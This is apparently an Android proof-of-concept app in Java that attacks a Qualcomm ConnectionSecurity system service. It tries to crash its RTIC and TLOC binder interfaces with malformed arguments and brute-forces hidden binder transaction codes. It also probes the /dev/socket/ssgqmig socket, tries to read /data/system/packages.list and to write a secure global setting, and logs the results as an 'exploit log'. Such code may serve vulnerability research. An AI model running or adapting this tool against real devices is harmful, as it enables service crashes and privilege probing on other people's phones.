package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IServiceManager mServiceManager;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            stopRequested.set(false);
            testThread = new Thread(() -> executeFullTest());
            testThread.start();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mServiceManager = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting.get()) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound || isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting.set(true);
        appendLog("========== PHASE 1: Service Enumeration & Crash ==========");
        IBinder rticBinder = getService("rtic");
        IBinder tlocBinder = getService("tloc");

        if (rticBinder != null) {
            IRticService rtic = IRticService.Stub.asInterface(rticBinder);
            crashRtic(rtic);
        }
        if (tlocBinder != null) {
            ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
            crashTloc(tloc);
        }

        appendLog("========== PHASE 2: Hidden Method Discovery ==========");
        if (rticBinder != null) discoverMethods(rticBinder, "IRticService");
        if (tlocBinder != null) discoverMethods(tlocBinder, "ITlocService");

        appendLog("========== PHASE 3: Direct Socket to ssgqmig ==========");
        tryConnectToSsgqmig();

        appendLog("========== PHASE 4: File Read/Write Tests ==========");
        testFileReadWrite();

        appendLog("========== PHASE 5: Settings Manipulation ==========");
        testSettingsWrite();

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("Got binder for " + serviceName + ", status=" + status[0]);
                return binder;
            } else {
                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("RemoteException for " + serviceName + ": " + e.getMessage());
            return null;
        }
    }

    private void crashRtic(IRticService rtic) {
        appendLog("--- Causing RticService crashes ---");
        // 空の配列で呼び出し -> ArrayIndexOutOfBoundsException
        int[][] emptyArrays = {
            new int[0],
            new int[0],
            null // null might cause NPE
        };
        for (int i = 0; i < emptyArrays.length; i++) {
            try {
                int[] status = emptyArrays[i] == null ? null : new int[emptyArrays[i].length];
                int[] ret = emptyArrays[i] == null ? null : new int[emptyArrays[i].length];
                appendLog("  Calling with array " + (i+1) + " (len=" + (emptyArrays[i] == null ? "null" : emptyArrays[i].length) + ")");
                rtic.getRticData(0, status, ret, false);
                appendLog("  No crash? status=" + (status != null ? status[0] : "null"));
            } catch (RemoteException e) {
                appendLog("  RemoteException: " + e.getMessage());
            } catch (Exception e) {
                appendLog("  Exception: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            }
            try { Thread.sleep(100); } catch (Exception ignored) {}
        }
        // 巨大なタイムスタンプでも試す
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            rtic.getRticData(Long.MAX_VALUE, status, ret, false);
            appendLog("  MAX_VALUE no crash");
        } catch (Exception e) {
            appendLog("  MAX_VALUE crash: " + e.getMessage());
        }
    }

    private void crashTloc(ITlocService tloc) {
        appendLog("--- Causing TlocService crashes ---");
        try {
            int[] status = new int[0];
            int[] ret = new int[0];
            tloc.getTrustedLocation(status, ret);
            appendLog("  No crash with empty arrays?");
        } catch (Exception e) {
            appendLog("  getTrustedLocation crash: " + e.getMessage());
        }
        try {
            int[] status = null;
            int[] ret = null;
            tloc.getTrustedLocation(status, ret);
            appendLog("  No crash with null?");
        } catch (Exception e) {
            appendLog("  getTrustedLocation with null crash: " + e.getMessage());
        }
        // 異常な配列長
        try {
            int[] status = new int[2];
            int[] ret = new int[2];
            tloc.getTrustedLocation(status, ret);
            appendLog("  No crash with len=2?");
        } catch (Exception e) {
            appendLog("  getTrustedLocation len=2 crash: " + e.getMessage());
        }
    }

    private void discoverMethods(IBinder binder, String serviceName) {
        appendLog("--- Discovering hidden methods for " + serviceName + " ---");
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("  readInt: " + result);
                    } catch (Exception e) {}
                    try {
                        String s = reply.readString();
                        appendLog("  readString: " + s);
                    } catch (Exception e) {}
                    try {
                        byte[] b = reply.createByteArray();
                        appendLog("  byte[] length: " + (b != null ? b.length : 0));
                    } catch (Exception e) {}
                } else {
                    appendLog("Method " + code + " failed");
                }
            } catch (Exception e) {
                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void tryConnectToSsgqmig() {
        appendLog("--- Trying to connect to /dev/socket/ssgqmig directly ---");
        LocalSocket socket = null;
        try {
            socket = new LocalSocket();
            socket.connect(new LocalSocketAddress("/dev/socket/ssgqmig", LocalSocketAddress.Namespace.FILESYSTEM));
            appendLog("Connected to ssgqmig!");
            OutputStream os = socket.getOutputStream();
            InputStream is = socket.getInputStream();
            // Send some simple QMI-like data? Not sure, just test connectivity.
            os.write("HELLO".getBytes(StandardCharsets.UTF_8));
            os.flush();
            byte[] buf = new byte[1024];
            int len = is.read(buf, 0, 1000);
            appendLog("Response length: " + len);
            socket.close();
        } catch (Exception e) {
            appendLog("Failed to connect to ssgqmig: " + e.getMessage());
            if (socket != null) try { socket.close(); } catch (Exception ignored) {}
        }
    }

    private void testFileReadWrite() {
        appendLog("--- Testing file read/write permissions ---");
        File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (!downloadDir.exists() && !downloadDir.mkdirs()) {
            appendLog("Cannot create Download dir");
            return;
        }
        // Write test
        try {
            File testFile = new File(downloadDir, "poc_write_test.txt");
            try (FileOutputStream fos = new FileOutputStream(testFile)) {
                fos.write("PoC write test\n".getBytes(StandardCharsets.UTF_8));
            }
            appendLog("Write to /sdcard/Download/poc_write_test.txt succeeded");
        } catch (Exception e) {
            appendLog("Write failed: " + e.getMessage());
        }
        // Read test (try to read /proc/version which is world-readable)
        try {
            File procVersion = new File("/proc/version");
            if (procVersion.exists() && procVersion.canRead()) {
                try (FileInputStream fis = new FileInputStream(procVersion)) {
                    byte[] data = new byte[1024];
                    int len = fis.read(data);
                    if (len > 0) {
                        String content = new String(data, 0, len, StandardCharsets.UTF_8);
                        appendLog("Read /proc/version: " + content.trim());
                    }
                }
            } else {
                appendLog("/proc/version not readable or not exists");
            }
        } catch (Exception e) {
            appendLog("Read /proc/version failed: " + e.getMessage());
        }
        // Try to read /data/system/packages.list (should be permission denied)
        try {
            File packagesList = new File("/data/system/packages.list");
            if (packagesList.exists()) {
                try (FileInputStream fis = new FileInputStream(packagesList)) {
                    byte[] data = new byte[1024];
                    int len = fis.read(data);
                    if (len > 0) {
                        String content = new String(data, 0, len, StandardCharsets.UTF_8);
                        appendLog("Read /data/system/packages.list (should fail): " + content.trim());
                    }
                }
            } else {
                appendLog("/data/system/packages.list not exists");
            }
        } catch (Exception e) {
            appendLog("Read /data/system/packages.list failed: " + e.getMessage());
        }
    }

    private void testSettingsWrite() {
        appendLog("--- Testing Settings write (WRITE_SECURE_SETTINGS) ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS);
            appendLog("Current hidden_api_blacklist_exemptions: " + current);
            // Try to write a test value (requires WRITE_SECURE_SETTINGS)
            boolean success = Settings.Global.putString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, "test_value");
            if (success) {
                appendLog("WRITE_SECURE_SETTINGS succeeded! We can modify system settings.");
                // Clean up
                Settings.Global.putString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, current);
            } else {
                appendLog("WRITE_SECURE_SETTINGS failed (permission denied)");
            }
        } catch (Exception e) {
            appendLog("Settings write error: " + e.getMessage());
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "connsec_exploit_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== ConnectionSecurity Exploit Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
